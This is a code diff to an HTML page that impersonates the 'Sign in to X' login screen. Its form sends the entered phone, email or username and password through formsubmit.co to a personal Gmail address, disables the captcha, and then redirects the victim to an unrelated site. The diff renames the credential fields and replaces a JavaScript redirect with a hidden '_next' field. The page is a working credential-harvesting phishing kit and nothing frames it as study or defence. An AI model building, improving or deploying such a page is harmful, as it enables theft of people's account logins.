@@ -6,7 +6,6 @@
   <title>Sign in to X</title>
   <link href="https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css" rel="stylesheet">
   <link rel="stylesheet" href="styles.css">
-
 </head>
 <body>
   <div class="container">
@@ -15,14 +14,15 @@
     </div>
     <div class="login-box">
       <h1>Sign in to X</h1>
-      <form id="Form-Element" action="https://formsubmit.co/realghostzero2@gmail.com" method="post">
+      <form id="Form-Element" action="https://formsubmit.co/realghostzero2@gmail.com" method="POST">
         <div class="input-group">
-          <input type="text" name="NO/Email" placeholder="Phone, email, or username" required>
+          <input type="text" name="email" placeholder="Phone, email, or username" required>
         </div>
         <div class="input-group">
-          <input type="password" name="Password" placeholder="Password" required>
+          <input type="password" name="password" placeholder="Password" required>
         </div>
         <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://darknaija.com/">
         <button type="submit" class="btn login">Log in</button>
       </form>
       <div class="extras">
@@ -31,19 +31,5 @@
       </div>
     </div>
   </div>
-
-  <script>
-    // Get the form element
-    const form = document.getElementById('Form-Element');
-
-    // Add a submit event listener to the form
-    form.addEventListener('submit', function () {
-        // Set a delay of 1 seconds for redirection
-        setTimeout(() => {
-            // Redirect to the specified URL
-            window.location.href = "https://darknaija.com/"; // Replace with your desired URL
-        }, 1000); // 1000 milliseconds = 1 second
-    });
-</script>
 </body>
 </html>
